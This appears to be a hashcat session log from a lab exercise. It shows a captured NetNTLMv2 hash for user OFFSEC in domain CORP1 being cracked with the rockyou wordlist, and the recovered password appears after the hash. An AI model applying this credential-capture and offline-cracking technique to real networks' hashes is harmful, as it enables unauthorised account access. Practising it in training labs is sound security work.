OFFSEC::CORP1:6d4107a34d067b4d:023d49828ef8cf2fe967f30eabe98e1f:01010000000000008091c48f9e00dd0100ded3456a802c3c0000000002000800340030005a00310001001e00570049004e002d00570033005200530039004f003300500051004700480004001400340030005a0031002e004c004f00430041004c0003003400570049004e002d00570033005200530039004f00330050005100470048002e00340030005a0031002e004c004f00430041004c0005001400340030005a0031002e004c004f00430041004c000800300030000000000000000100000000200000ae3add93d696baed7ba01ee89eafd344b7567d019b4bff1e2356291001b20e500a001000000000000000000000000000000000000900260048005400540050002f003100390032002e003100360038002e00340035002e003200300035000000000000000000:lab
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: OFFSEC::CORP1:6d4107a34d067b4d:023d49828ef8cf2fe967...000000
Time.Started.....: Sat Jun 20 09:25:44 2026 (2 secs)
Time.Estimated...: Sat Jun 20 09:25:46 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  1022.6 kH/s (2.00ms) @ Accel:1024 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 1601536/14344385 (11.16%)
Rejected.........: 0/1601536 (0.00%)
Restore.Point....: 1599488/14344385 (11.15%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: lacielou -> l004815
Hardware.Mon.#01.: Util: 58%

Started: Sat Jun 20 09:25:39 2026
Stopped: Sat Jun 20 09:25:47 2026
```

